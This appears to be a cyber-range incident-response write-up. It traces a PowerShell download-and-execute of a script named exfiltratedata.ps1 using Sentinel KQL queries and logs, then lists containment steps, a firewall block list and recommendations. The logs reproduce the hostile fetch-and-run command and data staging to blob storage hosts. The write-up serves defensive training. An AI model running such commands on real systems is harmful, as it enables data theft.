# Incident Response Scenario: Detect Web-Request from Powershell

## Platforms and Tools Used
- Windows 10 Virtual Machines (Microsoft Azure)
- Microsoft Sentinel
- Endpoint Detection and Response (EDR): Microsoft Defender for Endpoint (MDE)
- Kusto Query Language (KQL)

---

## Detection and Analysis

### Initial Alert

The investigation began with an alert from Microsoft Sentinel for the rule "Detect Web-Request from Powershell.exe - PN". The alert triggered based on the following Sentinel scheduled query rule:

```kql
DeviceProcessEvents
| where DeviceName == "ir-win10"
| where FileName == "powershell.exe"
| where InitiatingProcessCommandLine contains "Invoke-WebRequest"
| order by TimeGenerated
```

**Relevant TTPs:**
- **T1059.001**: Command and Scripting Interpreter: PowerShell
- **T1105**: Ingress Tool Transfer

![ir1](https://github.com/user-attachments/assets/1fab327c-eb1c-465a-99d7-83ac5688ca46)

This query detected the following suspicious command:

```powershell
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1
```

The command indicated that a PowerShell script (exfiltratedata.ps1) was downloaded from the internet to C:\ProgramData, a folder that is hidden by default on Windows. This suggests an attempt to conceal the file's presence and triggered further investigation.

### User Inquiry

I reached out to the user of ir-win10 to get some more context. They told me they had tried installing something, saw a black screen, and then said, "nothing happened afterward." This pointed to the possibility that a malicious script might have run without them realizing it.

### Process Events Analysis

To confirm the downloaded script's execution and identify further malicious activities, I queried process events:

```kql
DeviceProcessEvents
| where DeviceName == "ir-win10"
| project Timestamp, FileName, FolderPath, ProcessCommandLine
| order by Timestamp
```

**Corresponding TTPs:**
- **T1059.001**: Command and Scripting Interpreter: PowerShell
- **T1027**: Obfuscated Files or Information

![processquery](https://github.com/user-attachments/assets/e9197ad7-2365-4bbc-86fb-41a25c40ff57)

**Findings:**

| Timestamps                     | FileName         | FolderPath                                  | ProcessCommandLine                                        |
|--------------------------------|------------------|--------------------------------------------|---------------------------------------------------------|
| 8 Jan 2025 20:48:43, 19:48:40, 18:48:47 | 7z.exe           | C:\Program Files\7-Zip\                   | "7z.exe" a C:\ProgramData\employee-data-[TIMESTAMP].zip C:\ProgramData\employee-data-temp[TIMESTAMP].csv |
| 8 Jan 2025 20:48:37, 19:48:32, 18:48:40 | 7z2408-x64.exe   | C:\ProgramData\                           | "7z2408-x64.exe" /S                                    |
| 8 Jan 2025 20:48:35, 19:48:31, 18:48:38 | powershell.exe  | C:\Windows\System32\WindowsPowerShell\v1.0\ | powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1 |
| 8 Jan 2025 20:48:31, 19:48:27, 18:48:35 | powershell.exe  | C:\Windows\System32\WindowsPowerShell\v1.0\ | powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1 |

These logs confirmed the following sequence of events:
1. The script exfiltratedata.ps1 was downloaded and executed multiple times.
2. The script installed 7-Zip silently using 7z2408-x64.exe.
3. The installed 7-Zip (7z.exe) was used to compress sensitive data into ZIP files.

### Network Events Analysis

To identify any potential data exfiltration, I queried network events:

```kql
DeviceNetworkEvents
| where DeviceName == "ir-win10"
| project Timestamp, ActionType, RemoteIP, RemotePort, RemoteUrl, InitiatingProcessCommandLine
| order by Timestamp
```

**Corresponding TTPs:**
- **T1105**: Ingress Tool Transfer
- **T1041**: Exfiltration Over C2 Channel

![networkquery](https://github.com/user-attachments/assets/6fccbaf5-f771-4ba9-9805-e0baed7ed3de)

**Findings:**

| Timestamp          | ActionType       | RemoteIP          | RemotePort | RemoteUrl                                      | CommandLine                                           |
|--------------------|------------------|-------------------|------------|------------------------------------------------|-----------------------------------------------------|
| 8 Jan 2025 18:48:47 | ConnectionSuccess | 20.60.133.132     | 443        | https://sacyberrangedanger.blob.core.windows.net | powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1    |
| 8 Jan 2025 18:48:39 | ConnectionSuccess | 20.60.181.193     | 443        | https://sacyberrange00.blob.core.windows.net    | powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1    |
| 8 Jan 2025 18:48:35 | ConnectionSuccess | 185.199.109.133   | 443        | https://raw.githubusercontent.com              | powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1 |

These logs showed repeated connections to external endpoints, strongly supporting the hypothesis of data exfiltration.

### File Events Analysis

To identify artifacts related to data staging or exfiltration, I queried file events:

```kql
DeviceFileEvents
| where DeviceName == "ir-win10"
| project Timestamp, FileName, FolderPath, InitiatingProcessCommandLine, ActionType
| order by Timestamp desc
```

**Corresponding TTPs:**
- **T1027**: Obfuscated Files or Information
- **T1560.001**: Archive Collected Data: Archive via Utility

**Findings:**

![Filequery](https://github.com/user-attachments/assets/aba14b2e-9fbd-41aa-a33d-bfe771693a61)

**Findings:**

| Timestamps             | FileName                     | FolderPath                             | InitiatingProcessCommandLine                                          | ActionType |
|--------------------------------|------------------------------|----------------------------------------|------------------------------------------------------------------------|------------|
| 8 Jan 2025 20:48:44, 19:48:41, 18:48:47 | employee-data-[TIMESTAMP].zip | C:\ProgramData\backup\employee-data-[TIMESTAMP].zip | powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1 | FileRenamed |
| 8 Jan 2025 20:48:43, 19:48:40, 18:48:47 | employee-data-[TIMESTAMP].zip | C:\ProgramData\employee-data-[TIMESTAMP].zip        | "7z.exe" a C:\ProgramData\employee-data-[TIMESTAMP].zip C:\ProgramData\employee-data-temp[TIMESTAMP].csv | FileCreated |

These findings confirmed the repeated creation and renaming of ZIP files, consistent with attempts to stage data for exfiltration.

---

## Containment, Eradication, and Recovery

### Immediate Containment

1. **Quarantine Affected Device**:
   - Isolated ir-win10 from the network with Defender for Endpoint.

2. **Block Malicious IPs and URLs**:
   - Blocked the following IPs and domains in the firewall:
     - 185.199.109.133
     - 20.60.181.193
     - 20.60.133.132
     - https://raw.githubusercontent.com
     - https://sacyberrange00.blob.core.windows.net
     - https://sacyberrangedanger.blob.core.windows.net

### Investigation and Remediation

1. **Locate and Delete Malicious Artifacts**:
   - Removed all instances of exfiltratedata.ps1 from C:\programdata.
   - Deleted any related ZIP files (e.g., employee-data-*.zip) and temporary files.

2. **Scan the System**:
   - Performed a full system scan using Microsoft Defender for Endpoint.

3. **Analyze Network Traffic**:
   - Inspected logs to confirm no sensitive data was exfiltrated.

4. **Harden Endpoint Security**:
   - Disabled PowerShell for non-administrative users.
   - Enforced stricter PowerShell execution policies.
   - Implemented application whitelisting to block unauthorized executables.

---

## Post-Incident Activities

### Recommendations

1. **Enhance Monitoring**:
   - Create detection rules for unauthorized archiving tools and large file transfers.

2. **User Education**:
   - Train users to recognize suspicious activity.
   - Reinforce company policies against running untrusted scripts.

3. **Incident Documentation**:
   - Record all findings and actions taken.
   - Update incident response playbooks to include lessons learned.

### Post-Incident Monitoring

- Keep ir-win10 under close monitoring post-remediation.
- Conduct network-wide scans to ensure no other devices were compromised.

---

## Closure

The incident was successfully contained, eradicated, and the affected device fully recovered. Documentation has been updated with findings, actions taken, and recommendations. Lessons learned have been incorporated into the organization’s incident response playbooks to improve future response capabilities.

